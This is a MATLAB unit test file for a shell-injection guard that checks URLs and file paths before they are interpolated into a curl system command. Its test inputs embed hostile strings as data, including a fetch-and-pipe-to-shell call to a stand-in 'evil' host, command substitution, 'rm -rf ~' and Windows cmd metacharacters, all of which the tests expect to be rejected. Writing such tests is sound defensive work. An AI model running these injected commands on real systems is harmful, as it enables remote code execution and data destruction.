classdef AssertSafeCurlArgsTest < matlab.unittest.TestCase
    % ASSERTSAFECURLARGSTEST - regression tests for the curl shell-injection guard
    %
    % Guards ndi.cloud.api.implementation.files.assertSafeCurlArgs, which GetFile
    % and PutFiles now call before interpolating a server-supplied URL and a
    % local path into a system() curl command.
    %
    % Authored without a local MATLAB runtime; needs MATLAB to validate/run.

    methods (Test)

        function testAcceptsTypicalPresignedURL(testCase)
            % A realistic S3 pre-signed URL (with &, ?, =) is accepted.
            url = "https://ndi-files-prod.s3.amazonaws.com/abc123?" + ...
                "X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=3600&" + ...
                "X-Amz-Signature=deadbeef";
            testCase.verifyWarningFree(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/dest/abc123"));
        end

        function testAcceptsLocalPathWithSpaces(testCase)
            % The destination path is double-quoted, so spaces are legitimate.
            url = "https://x.s3.amazonaws.com/f";
            testCase.verifyWarningFree(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/Users/My Name/data/f"));
        end

        function testRejectsCommandSubstitutionInURL(testCase)
            url = "https://x/a"" ; curl http://evil/x.sh | sh ; echo """;
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/f"), ...
                'NDI:CloudApi:UnsafeCurlURL');
        end

        function testRejectsBacktickInURL(testCase)
            url = "https://x/`touch /tmp/pwned`";
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/f"), ...
                'NDI:CloudApi:UnsafeCurlURL');
        end

        function testRejectsDollarInURL(testCase)
            url = "https://x/$(touch /tmp/pwned)";
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/f"), ...
                'NDI:CloudApi:UnsafeCurlURL');
        end

        function testRejectsNonHttpsScheme(testCase)
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    "http://x.s3.amazonaws.com/f", "/tmp/f"), ...
                'NDI:CloudApi:UnsafeCurlURL');
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    "file:///etc/passwd", "/tmp/f"), ...
                'NDI:CloudApi:UnsafeCurlURL');
        end

        function testRejectsUnsafeCharsInPath(testCase)
            url = "https://x.s3.amazonaws.com/f";
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/f"" ; rm -rf ~ ; echo """, 'isWindows', false), ...
                'NDI:CloudApi:UnsafeCurlPath');
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/$(whoami)", 'isWindows', false), ...
                'NDI:CloudApi:UnsafeCurlPath');
        end

        function testAcceptsWindowsTempPath(testCase)
            % tempname() on Windows always contains backslashes; refusing
            % them broke every Windows cloud download and upload.
            url = "https://x.s3.amazonaws.com/f?X-Amz-Signature=abc";
            p = "C:\Users\Jane Doe\AppData\Local\Temp\tp1234abcd.zip";
            ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                url, p, 'isWindows', true);
        end

        function testRejectsCmdMetacharsInWindowsPath(testCase)
            url = "https://x.s3.amazonaws.com/f";
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "C:\Temp\%USERPROFILE%.zip", 'isWindows', true), ...
                'NDI:CloudApi:UnsafeCurlPath');
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "C:\Temp\a"" & calc & ""b.zip", 'isWindows', true), ...
                'NDI:CloudApi:UnsafeCurlPath');
        end

        function testStillRejectsBackslashPathOnUnix(testCase)
            url = "https://x.s3.amazonaws.com/f";
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    url, "/tmp/a\b", 'isWindows', false), ...
                'NDI:CloudApi:UnsafeCurlPath');
        end

        function testWindowsStillRejectsBackslashInURL(testCase)
            testCase.verifyError(@() ...
                ndi.cloud.api.implementation.files.assertSafeCurlArgs(...
                    "https://x/a\b", "C:\Temp\f.zip", 'isWindows', true), ...
                'NDI:CloudApi:UnsafeCurlURL');
        end

    end

end
